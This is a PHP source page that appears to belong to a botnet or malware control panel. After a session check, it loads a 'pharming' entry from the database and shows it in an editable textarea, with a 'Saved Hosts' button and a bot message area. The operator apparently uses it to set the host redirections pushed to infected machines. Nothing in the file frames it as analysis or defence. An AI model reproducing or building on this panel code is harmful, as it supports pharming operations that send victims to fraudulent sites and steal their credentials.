<?php
@session_start(); if ( !isset($_SESSION['login']) ){ exit() ; }
require_once('../includes.php');
	
$Pharming = $DB->Select("SELECT * FROM pharming");

?>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style TYPE='text/css'> 
<!-- 
body { scrollbar-face-color: #004B97; scrollbar-shadow-color: #000000; scrollbar-highlight-color: #000000; scrollbar-3dlight-color: #000000; scrollbar-darkshadow-color: #000000; scrollbar-track-color: #000000; scrollbar-arrow-color: #ffffff } 
--> 
</style>
<body background="archivos/imagen/bg.gif">
<form method="POST" action="">
<div align="center">
<img border="0" src="archivos/imagen/4_191.jpg" width="283" height="24" align="center" style="border: 1px solid #FFFFFF"><table style="border-style:solid; border-width:1px; border-collapse:collapse" width="754" bgColor="#808080" border="0" height="263">
<tr>
<td width="95%" height="257" align="middle" background="archivos/imagen/bg.gif" style="BORDER-RIGHT: #666666 1px solid; BORDER-TOP: #666666 1px solid; BORDER-LEFT: #666666 1px solid; BORDER-BOTTOM: #666666 1px solid; BACKGROUND-COLOR: #cccccc">
<p>
<textarea rows="8" name="texto" name="Pharming" id="pharming"  cols="44" style="border: 1px solid #333333;width:743; height:251; color:#FFFFFF; font-family:Tahoma; font-size:8pt; background-color:#000000">
<?php echo $Pharming[0]['pharming'] ; ?>
</textarea>
<br>
<input type='button' value='Saved Hosts'  onclick='submitpharming();' style="font-family: Tahoma; font-size: 8pt; border: 1px solid #FFFFFF; ; color:#666666; background-color:#000000"></p>
</td>
<div id='mensajebot' name='mensajebot' align='center' style="color:#FF0000"></div>
</tr>
</table>
</div>
</form>
</body>
</html>
